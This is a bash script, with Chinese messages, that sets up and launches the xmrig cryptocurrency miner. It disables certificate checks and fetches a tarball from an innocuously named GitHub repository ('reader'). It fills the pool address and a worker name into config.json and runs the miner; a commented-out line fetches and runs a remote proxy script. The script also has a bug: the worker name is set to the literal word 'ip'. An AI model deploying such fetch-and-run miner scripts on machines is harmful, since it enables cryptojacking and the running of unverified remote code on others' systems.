#!/usr/bin/env bash
check_root(){
	[[ $EUID != 0 ]] && echo -e "${Error} 当前账号非ROOT(或没有ROOT权限)，无法继续操作，请使用${Green_background_prefix} sudo su ${Font_color_suffix}来获取临时ROOT权限（执行后会提示输入当前账号的密码）。" && exit 1
}

Get_IP(){
	ip=$(wget -qO- -t1 -T2 ipinfo.io/ip)
	if [[ -z "${ip}" ]]; then
		ip=$(wget -qO- -t1 -T2 api.ip.sb/ip)
		if [[ -z "${ip}" ]]; then
			ip=$(wget -qO- -t1 -T2 members.3322.org/dyndns/getip)
			if [[ -z "${ip}" ]]; then
				ip="VPS_IP"
			fi
		fi
	fi
}

# check_root

p_address=$1
x_tar="$2.tar.gz"
worker_name=$3

echo -e "p_address -> ${p_address}"
echo -e "x_tar -> ${x_tar}"

sudo apt-get update
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y

# wget -N --no-check-certificate "https://raw.githubusercontent.com/jbs12/reader/master/ssr.sh" && chmod +x ssr.sh && bash ssr.sh

wget -N --no-check-certificate "https://raw.githubusercontent.com/jbs12/reader/master/${x_tar}" && tar zxvf ${x_tar}

if [[ -z "${worker_name}" ]]; then
	Get_IP
	worker_name=ip
fi

sed -i "s/WORKERNAME/${worker_name}/g" config.json
sed -i "s/P_ADDRESS/${p_address}/g" config.json

./xmrig
